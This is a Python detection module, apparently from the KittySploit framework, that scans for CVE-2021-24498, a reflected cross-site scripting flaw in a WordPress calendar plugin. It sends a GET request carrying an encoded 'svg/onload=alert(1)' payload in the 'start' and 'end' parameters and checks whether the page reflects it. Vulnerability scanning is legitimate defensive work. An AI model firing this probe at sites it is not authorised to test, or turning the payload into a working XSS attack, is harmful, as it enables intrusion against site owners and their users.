#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Calendar Event Multi View plugin before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Calendar Event Multi View <1.4.01 - Cross-Site Scripting Detection',
        'description': "WordPress Calendar Event Multi View plugin before 1.4.01 contains an unauthenticated reflected cross-site scripting vulnerability. It does not sanitize or escape the 'start' and 'end' GET parameters before outputting them in the page (via php/edit.php).",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'xss', 'wordpress', 'wp-plugin', 'wpscan', 'dwbooster', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/3c5a5187-42b3-4f88-9b0e-4fdfa1c39e86',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24498',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/ARPSyndicate/cvemon',
        ],
        'cve': 'CVE-2021-24498',
    }

    def run(self):
        path = '/?cpmvc_id=1&cpmvc_do_action=mvparse&f=edit&month_index=0&delete=1&palette=0&paletteDefault=F00&calid=1&id=999&start=a%22%3E%3Csvg/%3E%3C%22&end=a%22%3E%3Csvg/onload=alert(1)%3E%3C%22'
        r = self.http_request(method='GET', path=path, allow_redirects=False, headers={'Accept-Encoding': 'gzip, deflate', 'Accept-Language': 'en-GB,en-US;q=0.9,en;q=0.8', 'Connection': 'close'})
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('><svg/onload=alert(1)><', 'Calendar Details',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress Calendar Event Multi View <1.4.01 - Cross-Site Scripting detected', path=path)
            return True
        return False

